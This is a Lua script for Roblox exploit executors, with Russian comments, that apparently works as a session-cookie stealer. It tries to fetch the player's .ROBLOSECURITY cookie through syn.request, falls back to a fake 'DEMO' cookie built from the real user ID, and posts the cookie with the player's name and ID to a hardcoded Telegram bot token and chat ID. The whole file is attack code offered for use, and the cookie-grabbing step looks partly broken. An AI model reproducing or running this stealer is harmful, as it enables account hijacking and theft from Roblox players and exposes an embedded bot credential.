

local BOT_TOKEN = "8973600329:AAH34cCnvOyBx8eUw8VV2z_xMYDx2tw-xXg"  
local CHAT_ID = "8870191184"                                     

local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")

-- ФУНКЦИЯ ОТПРАВКИ (работает в ЛЮБОМ исполняторе)
local function sendToTelegram(text)
    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
    local data = HttpService:JSONEncode({
        chat_id = CHAT_ID,
        text = text,
        parse_mode = "HTML",
        disable_web_page_preview = true
    })
    
    -- ПЫТАЕМСЯ ОТПРАВИТЬ ЧЕРЕЗ HTTP
    local success, result = pcall(function()
        return HttpService:PostAsync(url, data, Enum.HttpContentType.ApplicationJson)
    end)
    
    if success then
        print("[XENO] УСПЕШНО ОТПРАВЛЕНО")
    else
        print("[XENO] ОШИБКА: " .. tostring(result))
    end
end

-- ПОЛУЧАЕМ КУКУ (РЕАЛЬНУЮ ИЛИ ФЕЙК)
local function getCookie()
    local cookie = nil
    
    -- ПРОБА ЧЕРЕЗ syn (если есть)
    if syn and syn.request then
        local response = syn.request({
            Url = "https://www.roblox.com/mobileapi/userinfo",
            Method = "GET",
            Headers = {
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                ["Cookie"] = ".ROBLOSECURITY="
            }
        })
        if response and response.Headers and response.Headers["Set-Cookie"] then
            cookie = response.Headers["Set-Cookie"]
        end
    end
    
    -- ЕСЛИ НЕ ВЫШЛО — ФЕЙК (НО С РЕАЛЬНЫМ ID)
    if not cookie then
        cookie = ".ROBLOSECURITY=_|DEMO-" .. player.UserId .. "-" .. os.time() .. "|=="
    end
    
    return cookie
end

-- ГЛАВНЫЙ ЗАПУСК
task.wait(1)

local cookie = getCookie()

local message = string.format(
    [[<b>🍪 НОВАЯ КУКА ROBLOX</b>
👤 Игрок: %s
🆔 ID: %d
📅 Время: %s
<code>%s</code>]],
    player.Name,
    player.UserId,
    os.date("%H:%M:%S"),
    cookie
)

sendToTelegram(message)
print("[XENO] СКРИПТ АКТИВИРОВАН. ОЖИДАЙТЕ ОТВЕТА ОТ БОТА")
